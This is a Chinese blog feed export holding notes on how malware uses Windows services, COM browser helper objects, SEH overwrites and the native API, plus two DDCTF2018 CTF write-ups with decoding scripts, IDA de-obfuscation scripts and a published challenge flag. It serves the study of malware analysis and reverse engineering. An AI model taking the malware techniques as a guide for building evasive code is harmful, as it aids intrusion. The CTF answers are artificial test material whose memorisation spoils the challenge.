返回一个服务控制管理器的句柄，它被用来进行所有后续与服务相关的函数调用。所有要和服务交互的代码会调用这个函数。<br>CreateService： 添加一个新服务到服务控制管理器，并且允许调用者指定服务是否在引导时自动启动，或者必须手动启动。<br>StartService： 启动一个服务，并且仅在服务被设置成手动启动时使用。</p></blockquote><p>Windows操作系统支持多种服务类型，它们以独特的方式执行。恶意代码最常使用的是WIN32_SHARE_PR0CESS类型，这种类型将这个服务的代码保存在一个DLL中，并且在一个共享的进程中组合多个同的服务。在任务管理器中，你可以找到一个名为svchost.exe进程的多个实例，它们在运行WIN32_SHARE_PR0CESS类型的服务。</p><blockquote><p>WIN32_OWN_PROCESS类型有时也被使用，因为它在一个.exe文件中保存代码，而且作为一个独立进程运行。</p></blockquote><blockquote><p>最后一个常见的服务类型是KERNEL_DRIVER,它被用来加载代码到内核中执行。</p></blockquote><blockquote><p>关于本地系统上服务的信息被保存在注册表中。每个服务在HKLM\SYSTEM\CurrentControlSet\Services下面有一个子键。</p></blockquote><h3 id="6-组件对象模型"><a href="#6-组件对象模型" class="headerlink" title="6. 组件对象模型"></a>6. 组件对象模型</h3><p>微软组件对象模型（COM)是一个接口标准，它使得不同软件组件在不知道其他组件代码的接口规范时，相互之间可以进行调用。</p><p>COM可以支持任何编程语言，并且被设计成一种可复用的软件组件，并可以被所有程序所利用。COM使用了一个对象结构，在与面向对象的编程语言中可以很好配合使用，COM也并不排斥非面向对象的编程语言。</p><p>COM被实现成一个客户-服务器框架。客户端是那些使用COM对象的程序，服务器是那些可复用的软件组件——也就是COM对象本身。微软提供了很多COM对象给程序使用。</p><p>每一个使用COM的线程，必须在调用任何其他COM库函数之前，至少调用一次Olelnitialize或CoInitializeEx函数。所以，一个恶意代码分析师可以搜索这些调用，来判断一个程序是否使用了COM功能，然而，知道恶意代码片段作为客户端程序使用COM对象并没有提供很多信息，因为COM对象是繁杂且广泛的。一旦你判断程序在使用COM,你就需要找到一些正在被使用对象的标识符来继续分析。</p><h4 id="CLSID、IID-以及COM对象的使用"><a href="#CLSID、IID-以及COM对象的使用" class="headerlink" title="CLSID、IID ,以及COM对象的使用"></a>CLSID、IID ,以及COM对象的使用</h4><blockquote><p>COM对象通过它们的全局唯一标识符(GUID),分为类型标识符(CLSID)以及接口标识符(IID)来进行访问。</p><p>CoCreatelnstance函数被用来获取对COM功能的访问。恶意代码使用的一个常用函数是Navigate , 它允许一个 程 序 启 动 Internet Explorer, 并访问一 个 Web地 址。Navigate函数是IWebBrowser2组件接口的一部分，这个接口指定了一个必须被实现的函数列表，但是它没有指定哪个程序会提供这个功能。提供这个功能的程序就是实现了IWebBrowser2接口的COM类。在多数例子中，IWebBrowser2接口被Internet Explorer实现。接口通过一个叫做IID的GUID来标识，而COM类通过一个叫做CLS1D的GUID来标识。</p></blockquote><h4 id="COM服务器恶意代码"><a href="#COM服务器恶意代码" class="headerlink" title="COM服务器恶意代码"></a>COM服务器恶意代码</h4><p>有些恶意代码实现了一个恶意COM服务器，继而被其他应用使用。对恶意代码来说，常用的COM服务器功能是通过浏览器帮助对象（B H O ), 这是Internet Explorer的第三方插件。BHO没有限制，所以恶意代码作者使用它们在Internet Explorer®程中运行代码，这允许他们监控互联网流量、跟踪浏览器的使用，以及与互联网通信，而且并不使用它们自己的进程。</p><p>实现一个COM服务器的恶意代码通常很容易检测，因为它导出了几个函数，包括DllCanUnloadNow、DllGetClassObject、Dlllnstall、DI 1 RegisterServer, 以及DllUnregisterServer，它们都必须由COM服务器软件导出。</p><h3 id="7-异常：当事情出错时"><a href="#7-异常：当事情出错时" class="headerlink" title="7. 异常：当事情出错时"></a>7. 异常：当事情出错时</h3><p>异常机制允许一个程序在普通执行流程之外处理事件。多数时间里，异常是由错误引起的，诸如除零错误。当一个异常发生时，执行转移到处理这个异常的特殊例程。有些异常，比如除零异常，是由硬件抛出的；其他的，比如无效内存访问，是由操作系统抛出的。你也可以在代码中使用RaiseException调用，显式地抛出一个异常。</p><p>结构化异常处理(SEH)是Windows的异常处理机制。在一个32位系统中，SEH信息被保存在桟上。</p><p>异常处理器是可嵌套的，并且不是所有的处理器都会对应着所有异常。如果当前帧的异常处理器不处理这个异常，这个异常会被传递给调用者帧的异常处理器。最终，如果这些异常处理器中没有一个响应这个异常，那么顶层的异常处理器将使应用程序崩溃。</p><p>异常处理器可以让恶意代码获得执行机会。一个指向异常处理信息的指针被保存在栈上，在栈溢出时，一个攻击者可以覆盖这个指针。通过指定一个新的异常处理器，攻击者可以在一个异常发生时获得执行机会。</p><h2 id="7x5-内核与用户模式"><a href="#7x5-内核与用户模式" class="headerlink" title="7x5 内核与用户模式"></a>7x5 内核与用户模式</h2><p>Windows使用两种处理器特权级别：内核模式与用户模式。</p><p>几乎所有代码都运行在用户模式，除了操作系统和硬件驱动，它们运行在内核模式。在用户模式，每一个进程有它自己的内存、安全权限，以及资源。如果一个用户模式程序执行一个无效指令并崩溃，Windows可以回收所有资源，并终止这个程序</p><p>通常，用户模式不能直接访问硬件，并且它被限制只能访问CPU上所有寄存器和可用指令的一个子集。为了在用户模式中操作硬件或改变内核中的状态，你必须依赖于Windows API。</p><p>当你调用一个Windows API函数操作内核结构体时，它会通过一个调用进入内核。在反汇编中SYSENTER、SYSCALL或者INT 0x2E的存在，指明一个调用被使用进入到内核。直接通过跳转从用户模式到内核模式是不可能的，这些指令使用查找表来定位一个预定义函数，从而在内核中执行代码。</p><p>所有运行在内核的进程共享资源和内存地址。内核模式代码有更少的安全检查。如果在内核运行的代码执行并且包含无效指令，操作系统就不能继续运行，产生的结果就是著名的Windows蓝屏。</p><p>运行在内核中的代码可以操纵运行在用户空间的代码，但是运行在用户空间的代码只能通过定义好的接口来影响内核。即使所有运行在内核的代码共享内存和资源，处于活跃状态的进程上下文也总是只有一个。</p><h2 id="7x6-原生API"><a href="#7x6-原生API" class="headerlink" title="7x6 原生API"></a>7x6 原生API</h2><p>原生API是用来和Windows进行交互的底层API。<br>调用原生API函数可以绕过普通的Windows API。</p><p>当调用Windows API中的一个函数时，这个函数通常不会直接执行请求的动作，因为大多数重要数据结构都被保存在内核中，在内核外面的代码 （用户模式代码）是无法访问它们的。微软为了使用户应用程序能够达到必需的功能，创建了一个多步骤的调用过程。<br><a href="https://i.loli.net/2018/07/19/5b5020114d7ce.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5020114d7ce.jpg" class="lazyload"></a></p><p>用户应用程序被给予对用户API (比如kernel32.dll和其他DLL)的访问，这些DLL会调用ntdlLdll,这是一个特殊的DLL程序，它管理用户空间与内核的交互。然后处理器切换到内核模式,并执行一个内核中的函数，通常它位于ntoskrnl.exe中。这个过程是令人费解的，但是内核和用户API之间的分离，允许微软修改内核而不会影响应用程序。</p><p>ntdll函数像内核中的函数一样，使用API和结构体。这些函数组成了原生API。</p><blockquote><p>尽管微软不提供关于原生API的完整文档，还是有网站和书来文档化这些函数。最好的参考书是由GaryNebbett (Sams, 2000)撰写的Windows NT/2000 Native API Reference，尽管它已经很旧了。在线资源如 <a href="http://undocumented.ntinternals.net" target="_blank" rel="noopener">http://undocumented.ntinternals.net</a> 以提供最近的信息。</p></blockquote><p>有一系列的原生API调用可以被用来获取关于系统的信息、进程、线程、句柄，以及其他项目。这 些 包 括 NtQuerySystemlnformation , NtQuerylnformationProcess &gt; NtQuerylnformationThread &gt; NtQuerylnformationFile, 以及NtQuerylnformationKey。这些调用提供比任何可用Win32调用更详细的信息，并且其中一些函数允许你给文件、进程、线程等设置细粒度的属性。</p><p>另一个恶意代码普遍使用的原生API函数是NtContinue。这个函数被用来从一个异常处理返回，并且它的意图是在一个异常被处理后转移执行回到一个程序的主线程。然而，要返回的位置在异常上下文中被指定，并且它可以被修改。恶意代码经常使用这个函数来以复杂的方式转移执行，从而使一个分析师感到困惑，并且使一个程序更加难调试。</p><p>原生应用程序是那些不使用Win32子系统而只调用原生API的应用程序。这样的应用程序对恶意代码来说是罕见的，对非恶意代码来说几乎是不存在的，所以一个原生应用程序很可能就是恶意的。在PE头中的子系统指明了一个程序是不是原生应用程序。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第七章-分析恶意Windows程序&quot;&gt;&lt;a href=&quot;#第七章-分析恶意Windows程序&quot; class=&quot;headerlink&quot; title=&quot;第七章 分析恶意Windows程序&quot;&gt;&lt;/a&gt;第七章 分析恶意Windows程序&lt;/h1&gt;&lt;h2</summary>
        
      
    
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    <category term="第二篇 静态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF2018 MISC writeup</title>
    <link href="https://kabeor.github.io/DDCTF2018%20MISC%20writeup/"/>
    <id>https://kabeor.github.io/DDCTF2018%20MISC%20writeup/</id>
    <published>2018-07-15T16:00:00.000Z</published>
    <updated>2020-03-16T04:41:22.806Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2018-MISC-writeup"><a href="#DDCTF2018-MISC-writeup" class="headerlink" title="DDCTF2018 MISC writeup"></a>DDCTF2018 MISC writeup</h1><h2 id="1-签到题"><a href="#1-签到题" class="headerlink" title="1.签到题"></a>1.签到题</h2><h2 id="2-╯°□°）╯︵-┻━┻"><a href="#2-╯°□°）╯︵-┻━┻" class="headerlink" title="2.(╯°□°）╯︵ ┻━┻"></a>2.(╯°□°）╯︵ ┻━┻</h2><p>给了一段编码</p><blockquote><p> d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</p></blockquote><p>可以看到这串字符只有数字和字母a-f，所以猜测应该是16进制。可以用异或的条件来判断一下，如果与ascii码异或以后得到的是正确的字符的话，异或的结果将不会是乱码。</p><p>思路感觉还是靠经验吧，各种各样的方法，不过总体来说是用<strong>移位爆破</strong>出来的</p><p>下面是两种解题脚本</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s&#x3D;&quot;d4 e8 e1 f4 a0 f7 e1 f3 a0 e6 e1 f3 f4 a1 a0 d4 e8 e5 a0 e6 ec e1 e7 a0 e9 f3 ba a0 c4 c4 c3 d4 c6 fb b7 b9 b8 e4 b5 b5 e4 e2 b7 b6 b5 b5 b2 e1 b9 b2 b2 e4 b0 b0 e4 b7 b7 b5 e5 b3 b3 b1 b1 b9 b0 b7 fd&quot;</span><br><span class="line">s&#x3D;s.split()</span><br><span class="line">for key in range(0,128+1,1):</span><br><span class="line">    for i in s:</span><br><span class="line">        i &#x3D; int(i,16)</span><br><span class="line">        print (chr((i + key + 256) % 256 ), end &#x3D; &#39;&#39;)</span><br><span class="line">    print (key)</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data&#x3D;bytearray.fromhex(&#39;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd&#39;)</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in data:</span><br><span class="line">    flag &#x3D; flag + chr(i &amp; 0x7f)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></div><p>最后得出flag</p><blockquote><p>That was fast! The flag is: DDCTF{798d55db76552a922d00d775e3311907}</p></blockquote><h2 id><a href="#" class="headerlink" title></a></h2><p>待补充</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;DDCTF2018-MISC-writeup&quot;&gt;&lt;a href=&quot;#DDCTF2018-MISC-writeup&quot; class=&quot;headerlink&quot; title=&quot;DDCTF2018 MISC writeup&quot;&gt;&lt;/a&gt;DDCTF2018 MISC</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="writeup" scheme="https://kabeor.github.io/tags/writeup/"/>
    
    <category term="DDCTF2018" scheme="https://kabeor.github.io/tags/DDCTF2018/"/>
    
    <category term="MISC" scheme="https://kabeor.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF2018 Reverse writeup(1) baby_mips</title>
    <link href="https://kabeor.github.io/DDCTF2018%20Reverse%20writeup(1)%20baby_mips/"/>
    <id>https://kabeor.github.io/DDCTF2018%20Reverse%20writeup(1)%20baby_mips/</id>
    <published>2018-07-15T16:00:00.000Z</published>
    <updated>2020-03-16T04:41:56.110Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2018-Reverse-writeup"><a href="#DDCTF2018-Reverse-writeup" class="headerlink" title="DDCTF2018 Reverse writeup"></a>DDCTF2018 Reverse writeup</h1><h2 id="baby-mips"><a href="#baby-mips" class="headerlink" title="baby_mips"></a>baby_mips</h2><p>花了一天，终于写完了</p><p>这是一道mips指令集的逆向题。<br>关于mips架构  <a href="https://zh.wikipedia.org/wiki/MIPS%E6%9E%B6%E6%A7%8B" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/MIPS%E6%9E%B6%E6%A7%8B</a></p><h3 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h3><p>在ubuntu运行<br><code>./baby_mips</code></p><p>会让输入16个值,然后提示非法指令<br><a href="https://i.loli.net/2018/07/16/5b4c615ee4801.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c615ee4801.jpg" class="lazyload"></a></p><p>在IDA中分析一下</p><h3 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>进入IDA首先就是搜索字符串<br>显而易见<br><a href="https://i.loli.net/2018/07/16/5b4c615f0bf91.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c615f0bf91.jpg" class="lazyload"></a><br>图形化分析这里<br><a href="https://i.loli.net/2018/07/16/5b4c615f2d212.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c615f2d212.jpg" class="lazyload"></a><br>可以看出是一个简单的条件判断</p><p>如果你以为F5看算法写脚本就结束，那就too native了</p><h3 id="使用qemu模拟器动态调试"><a href="#使用qemu模拟器动态调试" class="headerlink" title="使用qemu模拟器动态调试"></a>使用qemu模拟器动态调试</h3><p>baby_mips是MIPS指令集上的程序，IDA只能静态分析，不能debug。采取的方法是在linux机上安装qemu模拟器，利用qemu来运行MIPS指令程序。</p><p>因此，首先当然是在ubuntu上安装qemu模拟器了<br><code>sudo apt-get install qemu</code><br>就可以了</p><p>qemu可以模拟很多指令集<br><a href="https://i.loli.net/2018/07/16/5b4c615f4e755.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c615f4e755.jpg" class="lazyload"></a></p><p><strong>关于用法，最简单的</strong><br><code>qemu-你需要的指令集 文件名</code></p><p><strong>如果要利用IDA调试(IDA远程调试)</strong><br><code>qemu-你需要的指令集 -g 端口 文件名</code><br>原理：qemu -g port指令开启一个gdbserver。port另一端可以由IDA或gdb连接调试。</p><p>运行以后在IDA<br><a href="https://i.loli.net/2018/07/16/5b4c615f7382c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c615f7382c.jpg" class="lazyload"></a><br>选GDB调试，点左边绿色的RUN<br><a href="https://i.loli.net/2018/07/16/5b4c615f96143.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c615f96143.jpg" class="lazyload"></a><br>确定<br><a href="https://i.loli.net/2018/07/16/5b4c615fa8f78.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c615fa8f78.jpg" class="lazyload"></a><br>确定<br><a href="https://i.loli.net/2018/07/16/5b4c615fbcf6a.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c615fbcf6a.jpg" class="lazyload"></a></p><p>下面我们需要输入的是Hostname和Port，如果你是在运行qemu的系统里运行IDA，Hostname就填127.0.0.1，要是别的系统，比如你用的是虚拟机，就填运行qume的系统的IP,Port就填刚刚qemu里设置好的就行。(这些是常识了)</p><p>然后确认IDA就可以动态调试了</p><p>经过尝试，这里的baby_mips是mips小字端程序，所以我们运行指令<br><code>qemu-mipsel -g 6666 baby_mips</code><br>然后IDA点确定<br><a href="https://i.loli.net/2018/07/16/5b4c615fd14a2.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c615fd14a2.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/16/5b4c617b00159.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c617b00159.jpg" class="lazyload"></a><br>成功了</p><p>我们运行程序，输入16个数，弹出一个错<br><a href="https://i.loli.net/2018/07/16/5b4c617b26015.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c617b26015.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/16/5b4c617b4755e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c617b4755e.jpg" class="lazyload"></a></p><p>程序停在了00400430，并且这里的指令是以EB02开头的</p><p>往下翻翻，发现非常多的EB02，然后下面的指令就不被识别了</p><p><a href="https://i.loli.net/2018/07/16/5b4c617b69646.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c617b69646.jpg" class="lazyload"></a></p><p>IDA有一个强大的插件</p><blockquote><p>keypatch —–<a href="http://www.keystone-engine.org/keypatch/" target="_blank" rel="noopener">http://www.keystone-engine.org/keypatch/</a></p></blockquote><p>可以用这个插件把第一个EB02 NOP ，然后运行的话会发现又在下一个EB02报错，所以应该就是EB02的问题了</p><p>至于原理，参阅了很多篇wp，大概就是</p><blockquote><p>查找lwc1指令的含义，发现是与协处理器相关的指令。通过对后面的代码块进行分析发现，后面并没有用到$f29和$t1寄存器的内容</p><p>指令的头两个字节为 \xEB\x02 ，且在x86指令集中 \xEB 为跳转指令。</p><p>把操作码反汇编成汇编代码后发现第一条指令是 jmp 0x4 ，刚好MIPS指令集每条指令大小为4字节。</p><p>猜测程序让我们遇到这个指令就跳转四字节</p></blockquote><p>于是现在的思路就是将所有EB02开头的指令nop</p><p>由于MIPS指令是定长的，均为4个字节。因此，可以在选定的代码块中，将所有以EB 02开始的4字节数据全部替换成00 00 00 00，在MIPS指令中，nop对应的机器码为00 00 00 00</p><p>需要固定监测指令的头部，是因为可能会误清除掉正常指令</p><h3 id="使用脚本去除EB02指令"><a href="#使用脚本去除EB02指令" class="headerlink" title="使用脚本去除EB02指令"></a>使用脚本去除EB02指令</h3><p>下面是各位大佬写的IDC或IDPython脚本，功能都是去除EB02指令</p><hr><p>来自‘奈沙夜影’</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;idc.idc&gt;</span><br><span class="line"></span><br><span class="line">static matchBytes(StartAddr, Match) </span><br><span class="line">&#123; </span><br><span class="line">    auto Len, i, PatSub, SrcSub; </span><br><span class="line">    Len &#x3D; strlen(Match);</span><br><span class="line"></span><br><span class="line">    while (i &lt; Len) </span><br><span class="line">    &#123; </span><br><span class="line">       PatSub &#x3D; substr(Match, i, i+1); </span><br><span class="line">       SrcSub &#x3D; form(&quot;%02X&quot;, Byte(StartAddr)); </span><br><span class="line">       SrcSub &#x3D; substr(SrcSub, i % 2, (i % 2) + 1); </span><br><span class="line"></span><br><span class="line">       if (PatSub !&#x3D; &quot;?&quot; &amp;&amp; PatSub !&#x3D; SrcSub) </span><br><span class="line">       &#123; </span><br><span class="line">        return 0; </span><br><span class="line">       &#125; </span><br><span class="line"></span><br><span class="line">       if (i % 2 &#x3D;&#x3D; 1) </span><br><span class="line">       &#123; </span><br><span class="line">        StartAddr++; </span><br><span class="line">       &#125; </span><br><span class="line">       i++; </span><br><span class="line">    &#125;</span><br><span class="line">    return 1; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static main() </span><br><span class="line">&#123; </span><br><span class="line">   auto StartVa, SavedStartVa, StopVa, Size, i, j;</span><br><span class="line"></span><br><span class="line">    StartVa &#x3D; 0x400420; </span><br><span class="line">    StopVa &#x3D; 0x403233;</span><br><span class="line"></span><br><span class="line">    Size &#x3D; StopVa - StartVa; </span><br><span class="line">    SavedStartVa &#x3D; StartVa;</span><br><span class="line"></span><br><span class="line">    for (i &#x3D; 0; i &lt; Size&#x2F;4; i++) </span><br><span class="line">    &#123; </span><br><span class="line">       if (matchBytes(StartVa, &quot;EB02????&quot;)) </span><br><span class="line">       &#123; </span><br><span class="line">            Message(&quot;Find%x:%02x%02x%02x%02x\n&quot;, StartVa,Byte(StartVa),Byte(StartVa+1),Byte(StartVa+2),Byte(StartVa+3));</span><br><span class="line">            for (j &#x3D; 0; j &lt; 4; j++) </span><br><span class="line">            &#123; </span><br><span class="line"></span><br><span class="line">                 PatchByte(StartVa, 0x00); </span><br><span class="line">                 MakeCode(StartVa); </span><br><span class="line">                 StartVa++; </span><br><span class="line">            &#125; </span><br><span class="line">       &#125; </span><br><span class="line">        else</span><br><span class="line">            StartVa&#x3D;StartVa+4; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AnalyzeArea(SavedStartVa, StopVa); </span><br><span class="line">    Message(&quot;Clear eb02 Opcode Ok &quot;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><p>来自‘逢魔安全实验室’</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">f &#x3D; open(&quot;baby_mips&quot;, &quot;rb&quot;)</span><br><span class="line">content &#x3D; f.read()</span><br><span class="line">content &#x3D; list(content)</span><br><span class="line">for x in range(0, len(content)):</span><br><span class="line">    if content[x] &#x3D;&#x3D; &quot;\xeb&quot; and content[x+1] &#x3D;&#x3D; &quot;\x02&quot; and (x%4&#x3D;&#x3D;0):</span><br><span class="line">        content[x] &#x3D; &quot;\x00&quot;</span><br><span class="line">        content[x+1] &#x3D; &quot;\x00&quot;</span><br><span class="line">        content[x+2] &#x3D; &quot;\x00&quot;</span><br><span class="line">        content[x+3] &#x3D; &quot;\x00&quot;</span><br><span class="line">content &#x3D; &quot;&quot;.join(content)</span><br><span class="line">p &#x3D; open(&quot;patch&quot;, &quot;wb&quot;)</span><br><span class="line">p.write(content)</span><br></pre></td></tr></table></figure></div><hr><p>来自‘cq674350529’</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import idautils</span><br><span class="line">import idc</span><br><span class="line">import idaapi</span><br><span class="line"></span><br><span class="line">start_addr &#x3D; 0x400420</span><br><span class="line">end_addr &#x3D; 0x403234</span><br><span class="line">while start_addr &lt;&#x3D; end_addr:</span><br><span class="line">    if Byte(start_addr) &#x3D;&#x3D; 0xeb and Byte(start_addr +1) &#x3D;&#x3D; 0x2:</span><br><span class="line">        PatchByte(start_addr,0x00)</span><br><span class="line">        PatchByte(start_addr+1,0x00)</span><br><span class="line">        PatchByte(start_addr+2,0x00)</span><br><span class="line">        PatchByte(start_addr+3,0x00)</span><br><span class="line">    start_addr +&#x3D; 4</span><br></pre></td></tr></table></figure></div><hr><p>选择上述其中一个脚本，在桌面保存成一个.py或.idc文件<br>选择File-&gt;Script file或Script command</p><p><a href="https://i.loli.net/2018/07/16/5b4c617b7d80a.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c617b7d80a.jpg" class="lazyload"></a></p><p>然后import导入或直接写也可以，然后RUN<br><a href="https://i.loli.net/2018/07/16/5b4c617b906bc.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c617b906bc.jpg" class="lazyload"></a></p><p>关闭这个窗口，会有一个提示是否保存修改，点击Yes，这时桌面会生成一个patch<br><a href="https://i.loli.net/2018/07/16/5b4c617ba424b.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c617ba424b.jpg" class="lazyload"></a></p><p>IDA载入这个patch，可以发现在ubuntu下的IDA里指令都可以被识别，而且可以运行，我在win10运行的IDA会有几个小段不能识别，需要手动改为指令，将0x400420处的代码转换成函数</p><h3 id="将数据转为代码和函数"><a href="#将数据转为代码和函数" class="headerlink" title="将数据转为代码和函数"></a>将数据转为代码和函数</h3><p>首先往下看看，有几段没有识别的<br><a href="https://i.loli.net/2018/07/16/5b4c617bb9aa6.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c617bb9aa6.jpg" class="lazyload"></a><br>把它们全部选中(00401A58-00401F28)，右键,选择Analyze selected area或按C，<br><a href="https://i.loli.net/2018/07/16/5b4c617bce1a2.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c617bce1a2.jpg" class="lazyload"></a><br>选Analyze，然后Yes，然后就会变成代码<br><a href="https://i.loli.net/2018/07/16/5b4c618e6b9a9.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c618e6b9a9.jpg" class="lazyload"></a><br>当然这还没完，函数头部00400420没有变量声明，识别出来的肯定是错误的函数，因此在00400420右键，选择Create function<br><a href="https://i.loli.net/2018/07/16/5b4c618e978db.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c618e978db.jpg" class="lazyload"></a><br>就可以了<br>然后图形化分析就像下面那样</p><p><strong>记得保存修改，路径Edit-&gt;Patch program-&gt;Apply patches input file</strong></p><blockquote><p><strong>标准转换方式</strong></p><p>1.<em>函数和数据互换</em></p><p>在重新格式化之前，首先必须删除其当前的格式（代码或数据）。右击你希望取消定义的项目，在结果上下文菜单中选择Undefine（也可使用Edit▶Undefine命令或热键U），即可取消函数、代码或数据的定义</p><p>转换成code后，此时不能使用图形view<br>创建函数（Edit—&gt;Functions—&gt;Create Function….）就可以了</p><p>2.<em>代码和数据转换</em></p><p>通过Edit▶Data和热键D来完成,之后使用Undefine<br>之后使用code指令</p></blockquote><h3 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h3><h4 id="1-反编译器分析"><a href="#1-反编译器分析" class="headerlink" title="1.反编译器分析"></a>1.反编译器分析</h4><p>用图形化分析sub_400420这个函数<br><a href="https://i.loli.net/2018/07/16/5b4c618eac743.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c618eac743.jpg" class="lazyload"></a><br>一共十六个条件，必须每条都得满足才行</p><p>IDA的F5不能用，我们需要能够分析MIPS的反编译器<br>· <strong>Retdec</strong>     <a 